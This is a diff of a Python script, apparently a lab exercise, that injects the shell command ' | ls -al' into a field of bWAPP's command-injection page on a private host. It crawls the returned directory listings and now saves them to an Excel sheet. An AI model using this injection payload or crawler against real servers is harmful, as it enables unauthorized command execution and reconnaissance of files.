@@ -5,7 +5,7 @@ from openpyxl import Workbook
     
 headers = {
 "Referrer": "http://192.168.96.142/bWAPP/commandi.php",
-"Cookie" : "PHPSESSID=4195147d4ffc993e5191b0a155f081ab; security_level=0"
+"Cookie" : "PHPSESSID=63366313ceb465e8a60a3596fc916c05; security_level=0"
 }
 data = {
     "target" : " | ls -al",
@@ -54,32 +54,28 @@ def parse_directories(directory_name,depth=1):
                     
     else : print(f"HTML 파싱 실패!!: {directory_name},{depth}, 디렉토리명 : {directory_name}")
 
-    """ result_dir = {}
-    for item in result:
-        file_name, parent_dir = item
-        if file_name == '.':
-            result_dir[file_name] = '.'
-        else :
-            result_dir[file_name] = parent_dir """
-    print(result)
     return result
 
 
-parse_directories('.',depth=1)
-    
-
-
-
-'''
 # 메인 함수
 def main():
-    a =parse_directories('.',depth=1)
+
+    a = parse_directories('.', depth=1)
     book = openpyxl.Workbook()
     sheet = book.active
-    sheet.append(a)
+
+    for item in a:
+        list(item)
+        if not isinstance(item, tuple):
+        # 상위 디렉토리 이름을 첫 번째 셀에, 나머지 셀은 비워둠
+            sheet.append([item, ""])
+        else :  sheet.append(item)
+
+        #sheet.append(item)  # item은 튜플이며, 각 튜플을 하나의 행으로 추가
+
     book.save("result.xlsx")
     book.close()
 
+
 if __name__ == "__main__":
     main()
-'''
